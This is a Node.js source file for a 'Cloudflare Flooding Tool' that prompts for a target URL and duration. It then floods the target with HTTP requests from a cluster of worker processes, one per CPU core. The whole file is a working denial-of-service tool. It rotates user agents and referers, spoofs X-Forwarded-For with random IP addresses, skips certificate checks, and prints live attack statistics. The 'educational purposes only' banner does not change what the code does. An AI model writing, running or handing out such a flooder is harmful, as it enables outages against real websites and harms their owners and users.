const https = require('https');
const http = require('http');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');

class AdvancedCFBypass {
    constructor() {
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            lastRequestTime: Date.now(),
            requestsPerSecond: 0,
            startTime: Date.now()
        };

        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 6.0.1; SM-G800H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36'
        ];
        
        this.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.youtube.com/',
            'https://pornhub.com',
            'https://instagram.com',
            'https://fbi.com',
            'https://www.pinterest.com/search/?q='
        ];
    }

    updateStats(success = true) {
        this.stats.totalRequests++;
        if (success) {
            this.stats.successfulRequests++;
        } else {
            this.stats.failedRequests++;
        }

        // Calculate requests per second
        const now = Date.now();
        const elapsedSeconds = (now - this.stats.startTime) / 1000;
        this.stats.requestsPerSecond = Math.round(this.stats.totalRequests / elapsedSeconds);
        this.stats.lastRequestTime = now;
    }

    displayStats() {
        const duration = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const minutes = Math.floor(duration / 60);
        const seconds = duration % 60;
        
        console.clear();
        console.log(chalk.bold.underline('=== ATTACK STATUS ==='));
        console.log(chalk.green(`Running Time: ${minutes}m ${seconds}s`));
        console.log(chalk.cyan(`Total Requests: ${this.stats.totalRequests}`));
        console.log(chalk.green(`Successful: ${this.stats.successfulRequests}`));
        console.log(chalk.red(`Failed: ${this.stats.failedRequests}`));
        console.log(chalk.yellow(`Req/Sec: ${this.stats.requestsPerSecond}`));
        console.log(chalk.blue(`Success Rate: ${Math.round((this.stats.successfulRequests / Math.max(1, this.stats.totalRequests)) * 100)}%`));
        console.log(chalk.bold.underline('===================='));
    }

    getRandomUserAgent() {
        return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }

    getRandomReferer() {
        return this.referers[Math.floor(Math.random() * this.referers.length)];
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    async sendRequest(targetUrl) {
        try {
            const parsedUrl = new URL(targetUrl);
            const isHttps = parsedUrl.protocol === 'https:';
            const port = parsedUrl.port || (isHttps ? 443 : 80);
            const path = parsedUrl.pathname || '/';

            const options = {
                hostname: parsedUrl.hostname,
                port: port,
                path: path,
                method: 'GET',
                headers: {
                    'User-Agent': this.getRandomUserAgent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Referer': this.getRandomReferer(),
                    'X-Forwarded-For': this.generateRandomIP(),
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                rejectUnauthorized: false,
                timeout: 10000
            };

            return new Promise((resolve) => {
                const protocol = isHttps ? https : http;
                const req = protocol.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => {
                        this.updateStats(res.statusCode === 200);
                        resolve(true);
                    });
                });

                req.on('error', (e) => {
                    this.updateStats(false);
                    resolve(false);
                });

                req.on('timeout', () => {
                    req.destroy();
                    this.updateStats(false);
                    resolve(false);
                });

                if (Math.random() > 0.7) {
                    options.method = 'POST';
                    req.write(crypto.randomBytes(32).toString('hex'));
                }

                req.end();
            });
        } catch (e) {
            this.updateStats(false);
            return false;
        }
    }

    async startWorker(targetUrl) {
        while (true) {
            await this.sendRequest(targetUrl);
            // Random delay between requests
            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 100)));
        }
    }

    async startClusterFlood(targetUrl, durationMs) {
        if (cluster.isMaster) {
            console.log(chalk.bold(`[+] Master ${process.pid} is running`));
            console.log(chalk.bold(`[+] Starting ${os.cpus().length} workers`));

            // Start stats display
            const statsInterval = setInterval(() => {
                this.displayStats();
            }, 1000);

            // Fork workers
            for (let i = 0; i < os.cpus().length; i++) {
                cluster.fork();
            }

            // Set attack duration
            setTimeout(() => {
                clearInterval(statsInterval);
                console.log(chalk.red('[+] Attack completed, killing workers'));
                for (const id in cluster.workers) {
                    cluster.workers[id].kill();
                }
                this.displayStats();
                process.exit(0);
            }, durationMs);

        } else {
            // Worker process
            await this.startWorker(targetUrl);
        }
    }
}

// Main execution
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log(chalk.bold.blue('=== Cloudflare Flooding Tool ==='));
console.log(chalk.yellow('WARNING: For educational purposes only!\n'));

rl.question('Enter target URL (include http/https): ', (targetUrl) => {
    rl.question('Attack duration (minutes): ', (minutes) => {
        rl.close();

        if (!targetUrl.startsWith('http')) {
            targetUrl = 'https://' + targetUrl;
        }

        try {
            new URL(targetUrl); // Validate URL
            const durationMs = parseInt(minutes) * 60 * 1000;
            const attacker = new AdvancedCFBypass();
            console.log(chalk.green(`\n[+] Starting attack on ${targetUrl} for ${minutes} minutes`));
            attacker.startClusterFlood(targetUrl, durationMs);
        } catch (e) {
            console.log(chalk.red('[!] Invalid URL format'));
            process.exit(1);
        }
    });
});
